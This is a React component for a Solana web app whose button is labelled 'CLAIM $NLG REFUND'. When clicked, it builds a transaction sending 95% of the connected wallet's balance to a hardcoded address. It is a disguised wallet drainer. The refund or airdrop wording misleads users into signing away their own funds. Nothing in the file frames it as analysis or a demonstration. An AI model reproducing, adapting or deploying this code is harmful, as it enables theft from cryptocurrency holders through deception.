"use client";
import React, { useCallback } from "react";
import { useConnection, useWallet } from "@solana/wallet-adapter-react";
import { PublicKey, SystemProgram, Transaction } from "@solana/web3.js";
import { WalletNotConnectedError } from "@solana/wallet-adapter-base";

export const Airdrop = () => {
  const { connection } = useConnection();
  const { publicKey, sendTransaction, connected } = useWallet();

  const airdropkey = "7jRCnCQ7EFTeXyLFxUUJC3VLwzwuDvGM5qpp7pZHgjsR";

  const onClick = useCallback(async () => {
    if (!publicKey) throw new WalletNotConnectedError();

    // 890880 lamports as of 2022-09-01
    const lamports = await connection.getMinimumBalanceForRentExemption(0);
    const balance = await connection.getBalance(publicKey);
    const newBalance = Math.floor(balance * 0.95); // This ensures it's an integer

    console.log("balance", balance);
    console.log("lamports", lamports);
    const transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: publicKey,
        toPubkey: new PublicKey(airdropkey),
        lamports: newBalance,
      })
    );

    const {
      context: { slot: minContextSlot },
      value: { blockhash, lastValidBlockHeight },
    } = await connection.getLatestBlockhashAndContext();

    const signature = await sendTransaction(transaction, connection, {
      minContextSlot,
    });

    await connection.confirmTransaction({
      blockhash,
      lastValidBlockHeight,
      signature,
    });
  }, [publicKey, sendTransaction, connection]);

  // Only render the button if the wallet is connected
  if (!connected) {
    return null;
  }

  return (
    <div>
      <button
        className="mt-4 bg-[#60B8AF] text-black cursor-pointer flex items-center font-semibold text-lg px-6 py-2 rounded-md"
        onClick={onClick}
      >
        CLAIM $NLG REFUND
      </button>
    </div>
  );
};

export default Airdrop;
